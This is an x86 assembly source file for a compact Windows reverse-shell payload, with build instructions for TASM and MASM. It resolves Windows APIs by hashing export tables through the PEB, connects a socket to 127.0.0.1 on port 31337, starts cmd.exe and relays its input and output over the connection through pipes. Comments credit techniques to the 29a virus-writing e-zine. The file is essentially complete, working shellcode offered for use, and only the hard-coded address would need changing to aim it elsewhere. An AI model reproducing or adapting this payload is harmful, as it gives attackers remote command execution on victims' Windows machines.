comment ~

	Reverse connect to localhost on port 31337 using PIPES as I/O to CMD.EXE.
	
	Size -> about 357 bytes

	You can assemble with instructions below.
	Its a bit lame, but you must terminate this with CTRL-C
	
TASM
	implib -c -i -o -f import32.lib %SYSTEMROOT%\System32\ws2_32.dll
	tasm32 /dTASM /ml rev_pipes.asm
	tlink32 /Tpe /ap /x rev_pipes,,,import32.lib

MASM
	ml /DMASM /Cp /c /coff /I c:\masm32\include rev_pipes.asm
	link /SUBSYSTEM:CONSOLE /LIBPATH:c:\masm32\lib rev_pipes.obj

	bcom@hushmail.com

~
.586
.model flat, stdcall

IFDEF MASM
include	<ws2_32.inc>
.data
pad	db	0
.code
ENDIF

IFDEF TASM
extrn	WSAStartup	:proc
.code
	ret
.data
ENDIF

HASH_CONSTANT	EQU	7

;					macro for generating 16-bit api hashes
hashapi	macro	szApi
	local	dwHash
	dwHash = 0

	forc x, <szApi>
		dwHash = dwHash + "&x"
		dwHash = (dwHash shl HASH_CONSTANT) or (dwHash shr (32-HASH_CONSTANT))
	endm
	dwHash = dwHash and 0ffffh
	dw	dwHash
endm

	assume	fs:nothing
main:
	mov	eax, end_code-ReverseConnect	; size of code in eax
	
	sub	esp, 200h
	push	esp
	push	02h
	call	WSAStartup
	add	esp, 200h

	call	ReverseConnect
;================================= all code below is independent of address

szInputBuffer		equ	ebp+64

pipe_out_pread		equ	ebp+60
pipe_out_pwrite		equ	ebp+56
pipe_in_pread		equ	ebp+52
pipe_in_pwrite		equ	ebp+48
pipes				equ	ebp+48

hLoadLibraryA		equ	ebp-128
hCreatePipe			equ	ebp-124
hCreateProcess		equ	ebp-120
hPeekNamedPipe		equ	ebp-116
hReadFile			equ	ebp-112
hWriteFile			equ	ebp-108
hSleep			equ	ebp-104

hsocket			equ	ebp-100
hconnect			equ	ebp-96
hsend				equ	ebp-92
hioctlsocket		equ	ebp-88
hrecv				equ	ebp-84

hsock				equ	ebp-52
dwBytesRead			equ	ebp-48
pinfo				equ	ebp-44

ReverseConnect:
	enter	256, 00h				; create 256 byte stack for local variables.
	mov	edi, ebp				; 
	add	ebp, 127
	inc	ebp

	push	30h					
	pop	ecx
	mov	eax, fs:[ecx]
	mov	eax, [eax + 0ch]
	mov	esi, [eax + 1ch]
	lodsd
	mov	ebx, [eax + 08h]			

	call	load_api_hashes

	hashapi <LoadLibraryA>
	hashapi <CreatePipe>
	hashapi <CreateProcessA>
	hashapi <PeekNamedPipe>
	hashapi <ReadFile>
	hashapi <WriteFile>
	hashapi <Sleep>
	
	db	"ws2_32",00h
	
	hashapi <socket>
	hashapi <connect>
	hashapi <send>
	hashapi <ioctlsocket>
	hashapi <recv>

load_api_hashes:
	mov	cl, 07h					; number of hashes to retrieve first..
get_apis_loop:
	pushad
	mov	ebp, [esp + 20h]
	movzx	eax, word ptr [ebx + 3ch]
	mov	esi, [eax + ebx + 78h]
	lea	esi, [ebx + esi + 1ch]
	lodsd
	add	eax, ebx
	push	eax
	lodsd
	lea	edi, [eax + ebx]
	lodsd
	add	eax, ebx
	push	eax
	xor	ecx, ecx
load_index:
	mov	esi, [edi + 4 * ecx]
	add	esi, ebx
	xor	eax, eax
	cdq
hash_export:
	lodsb
	add	edx, eax
	rol	edx, HASH_CONSTANT
	dec	eax
	jns	hash_export
	ror	edx, HASH_CONSTANT
	inc	ecx
	cmp	dx, word ptr [ebp]
	jne	load_index
	dec	ecx
	pop	eax
	pop	esi
	movzx	eax,  word ptr [eax + 2 * ecx]
	add	ebx, dword ptr [esi + 4 * eax]
	mov	[esp + 28], ebx
	popad
	add	dword ptr [esp], 02h
	stosd
	loop	get_apis_loop

	push	dword ptr [esp]
	call	dword ptr [hLoadLibraryA]
	add	dword ptr [esp], 07h
	push	05h
	pop	ecx
	dec	edx
	xchg	eax, ebx
	jnz	get_apis_loop
	pop	eax

	push	ebx				; IPPROTO_IP
	push	01h				; SOCK_STREAM
	push	02h				; AF_INET
	call	dword ptr [hsocket]
	mov	[hsock], eax
		
	push	ebx
	push	ebx
	push	00100007fh			; 127.0.0.1
	push	0697a0002h			; 31337
	mov	edx, esp
	
	push	10h				; sizeof sockaddr_in
	push	edx				; *sockaddr_in
	push	eax				; socket
	call	dword ptr [hconnect]
	add	esp, 4*4				; free sockaddr_in structure on stack
	
	push	01h					; inherit handles = true
	push	ebx					; no descriptor
	push	0ch					; sizeof SECURITY_ATTRIBUTES
	mov	edi, esp

	lea	esi, [pipes]
	push	esi
	clc
create_pipes:				; the trick with carry flag, I saw done by Vecna/29a
	pushfd				; in issue 7 of 29a e-zine, nice one sir!
	push	ebx
	push	edi
	push	esi
	lodsd
	push	esi
	lodsd
	call	dword ptr [hCreatePipe]
	popfd
	cmc
	jc	create_pipes
	pop	ecx
	add	esp, 0ch

	push	"dmc"
	mov	edx, esp

	push	dword ptr[ecx]
	push	dword ptr[ecx]
	push	dword ptr [pipe_out_pread]
	push	ebx
	push	ebx

	inc	ah
	push	eax			; i saw this STARTUPINFO trick in Z0MBiE/29a Shell code generator example
	push	11			; and also in exploit code by Vecna/29a around same time.
	pop	ecx
push_stinfo:
	push	ebx
	loop	push_stinfo
	mov	eax, esp

	lea	ecx, [pinfo]
	push	ecx

	push	eax
	push	ebx
	push	ebx
	push	ebx
	push	01h
	push	ebx
	push	ebx
	push	edx
	push	ebx
	call	dword ptr [hCreateProcess]
	add	esp, 48h
cmd_loop:
	push	ebx
	push	ebx
	lea	esi, [dwBytesRead]
	push	esi
	push	64
	lea	edi, [szInputBuffer]
	push	edi
	push	dword ptr[pipe_in_pread]
	call	dword ptr [hPeekNamedPipe]

	mov	ecx, [esi]
	jecxz	cmd_get_user_input

	push	ebx
	push	ecx
	push	edi
	push	dword ptr [hsock]
	;----------------------	
	push	ebx				
	push	esi				
	push	ecx				
	push	edi				
	push	dword ptr[pipe_in_pread]
	call	dword ptr [hReadFile]
	;-----------------------------
	call	dword ptr [hsend]
cmd_get_user_input:
	push	esi
	push	4004667Fh				; FIONREAD
	push	dword ptr[hsock]
	call	dword ptr [hioctlsocket]

	mov	ecx, [esi]				; anything waiting to be read?
	jecxz	cmd_sleep

	push	ebx
	push	esi
	push	ecx
	push	edi
	push	dword ptr[pipe_out_pwrite]	
	;-------------------------------
	push	ebx
	push	ecx
	push	edi
	push	dword ptr[hsock]
	call	dword ptr [hrecv]			; receive infos
	;-------------------------------
	call	dword ptr [hWriteFile]		; write to cmd.exe
cmd_sleep:
	push	10					; sleep for while, avoid thrashing.
	call	dword ptr [hSleep]
	jmp	cmd_loop
end_code:

end	main